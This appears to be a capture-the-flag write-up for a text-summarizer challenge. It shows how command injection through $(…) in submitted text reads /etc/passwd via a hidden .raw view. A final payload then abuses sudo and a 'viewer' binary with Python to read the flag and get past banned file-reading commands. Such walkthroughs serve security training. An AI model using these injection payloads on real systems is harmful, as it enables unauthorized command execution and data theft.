# Solution
POC is really simple, just provide a large text and use ``$(<linux command here>)`` as part of the passage, as shown in the example below:

```
Generating random paragraphs can be an excellent way for writers to get their creative flow going at the beginning of the day. The writer has no idea what topic the random paragraph will be about when it appears. This forces the writer to use creativity to complete one of three common writing challenges. The writer can use the paragraph as the first one of a short story and build upon it. A second option is to use the random paragraph somewhere in a short story they create. The third option is to have the random paragraph be the ending paragraph in a short story. No matter which of these challenges is undertaken, the writer is forced to use creativity to incorporate the paragraph into their writing. $(cat /etc/passwd)
```

A URL will be provided at the bottom of the summary for users to download. When you view the text file you will see the summary and the input provided above. However in the HTML template code there is a small little comment:
```
<!-- A raw version exists. Change the extension to .raw -->
```

Based on the link provided, you change the extension of the summary file from ``.txt`` to ``.raw`` and you'd see something like this:

```
Original Text:
Generating random paragraphs can be an excellent way for writers to get their creative flow going at the beginning of the day. The writer has no idea what topic the random paragraph will be about when it appears. This forces the writer to use creativity to complete one of three common writing challenges. The writer can use the paragraph as the first one of a short story and build upon it. A second option is to use the random paragraph somewhere in a short story they create. The third option is to have the random paragraph be the ending paragraph in a short story. No matter which of these challenges is undertaken, the writer is forced to use creativity to incorporate the paragraph into their writing. root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
appuser:x:999:999::/home/appuser:/bin/sh


Summary:
• Random paragraphs generate new topics for writers to explore.
• Writers must come up with creative solutions using the random paragraph as a starting point.
• Options include incorporating the paragraph into a short story, using it as a separate element, or ending a short story with it.
• The goal is to use creativity to overcome writing challenges.
```

Well from there it's quite self-explanatory as it is a classic Command Injection RCE. The flag is located in /app/flag.txt, and you will need to use these two attack vectors:
- the sudo privileges of 'flagviewer' via 'appuser'.
- the 'viewer' binary to view the flag
    - However the binary will not output the result of the commands supplied as common Linux binaries that display file content are banned, so you will need to find a way to bypass this).

POC to submit to get the flag (there are other ways to do it but i'll leave it up to you to explore hehe):
```
Generating random paragraphs can be an excellent way for writers to get their creative flow going at the beginning of the day. The writer has no idea what topic the random paragraph will be about when it appears. This forces the writer to use creativity to complete one of three common writing challenges. The writer can use the paragraph as the first one of a short story and build upon it. A second option is to use the random paragraph somewhere in a short story they create. The third option is to have the random paragraph be the ending paragraph in a short story. No matter which of these challenges is undertaken, the writer is forced to use creativity to incorporate the paragraph into their writing. $(sudo -u flagviewer /app/viewer "python -c 'print(open(\"/app/flag.txt\").read())'")
```
